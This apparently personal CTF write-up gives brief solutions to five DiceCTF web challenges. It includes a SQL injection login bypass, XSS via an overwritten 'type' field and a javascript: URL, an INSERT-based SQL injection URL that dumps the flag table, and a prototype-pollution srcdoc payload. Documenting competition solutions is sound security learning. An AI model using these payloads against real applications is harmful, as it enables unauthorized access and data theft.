# DiceCTF

## babierCSP

Simply use `location.href` to bypass CSP and follow the nonce of the `script-src`

## Missing Flavortext

`username=admin&password[]=' or 1=1 -- `

## Web Utils

the service allows you to either submit a url as link or some plaintext as paste that there is no way to xss.
However, it pass the whole body as extendable param so we can overwrite the `type`. 
```javascript
database.addData({ type: 'link', ...req.body, uid });
```
The service uses `window.location=data` when type is link , then you can use `javascript:xxx` to get xss on view page.

## build-a-panel

There 's a easy unintended solution for this one :( I stuck in the way to intended solution.
in `/admin/debug/add_widget` there 's a `insert into` type sql injection. So it is able to inject the flag into the database
when visiting `/panel` , it will fetch api according to your widget id then you can see the flag
```url
https://build-a-panel.dicec.tf/admin/debug/add_widget?panelid=a292332b-9e6a-4353-a300-66f43237920e', (SELECT * FROM flag),'{"type":"weather"}');--&widgetname=a&widgetdata=a
```

## Build a Better Panel

So this is the intended solution for the last one. I fail to solve it generally because I tend to use the sql-injection as blind-based......
It is easy to notice there is a front-end xss in `safeDeepMerge` function since we can bypass it with `prototype`. And there is a gadget using cross-origin embedded reddit posts.
```javascript
Object.prototype.onload = 'alert(1)'
```
another important thing is that you can't using in-line script because of CSP. But since we just need to let the admin visit the page with xss. you can simply
add the url that we used in the last challenge as src.
the src-doc attr of iframe is helpful

```javascript
{"widgetName":"welcome back to build a panel!","widgetData":"{"constructor":{"prototype":{"srcdoc":"<script src='https://build-a-better-panel.dicec.tf/admin/debug/add_widget?panelid=a292332b-9e6a-4353-a300-66f43237920e', (SELECT * FROM flag),'{"type":"weather"}');--&widgetname=a&widgetdata=a'>\"}}}"}
```